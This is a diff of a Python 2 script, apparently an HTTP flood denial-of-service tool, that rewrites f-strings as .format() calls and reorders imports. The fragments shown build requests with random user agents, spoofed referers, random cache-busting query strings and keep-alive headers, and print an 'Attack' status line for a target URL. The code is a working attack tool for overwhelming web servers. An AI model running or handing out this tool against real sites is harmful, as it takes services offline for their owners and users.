@@ -1,13 +1,15 @@
 #!/usr/bin/python
 
+import getopt
+import sys
 import os
 import re
-import sys
 import time
 import signal
 import random
-import urllib2  # Use urllib2 for Python 2
+import urllib2
 import threading
+
 
 def usage():
     print('  #######################')
@@ -35,9 +37,9 @@ def useragent_list():
 # Generates a referer array
 def referer_list():
     return [
+        'http://{}/'.format(host),
         'http://www.usatoday.com/search/results?q=',
-        'http://engadget.search.aol.com/search?q=',
-        f'http://{host}/'
+        'http://engadget.search.aol.com/search?q='
     ]
 
 def handler(signum, _):
@@ -51,12 +53,12 @@ def buildblock(size):
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
 def send_packet(host, param_joiner):
-    url_params = f"{url}{param_joiner}{buildblock(random.randint(3, 10))}={buildblock(random.randint(3, 10))}"
+    url_params = "{}{}{}={}".format(url, param_joiner, buildblock(random.randint(3, 10)), buildblock(random.randint(3, 10)))
     headers = {
         'User-Agent': random.choice(useragent_list()),
         'Cache-Control': 'no-cache',
         'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Referer': f"{random.choice(referer_list())}{buildblock(random.randint(5, 10))}",
+        'Referer': '{}{}'.format(random.choice(referer_list()), buildblock(random.randint(5, 10))),
         'Keep-Alive': str(random.randint(110, 120)),
         'Connection': 'keep-alive',
         'Host': host
@@ -101,12 +103,12 @@ if __name__ == '__main__':
         sys.exit()
 
     parse_parameters(sys.argv[1:])
-    print(f"   Attack : thread={num_thread} time={interval} {url}")
+    print("   Attack : thread={} time={} {}".format(num_thread, interval, url))
 
     if url.count('/') == 2:
         url = url + "/"
 
-    m = re.search('http\://([^/]*)/?.*', url)
+    m = re.search('http://([^/]*)/?.*', url)
 
     try:
         host = m.group(1)
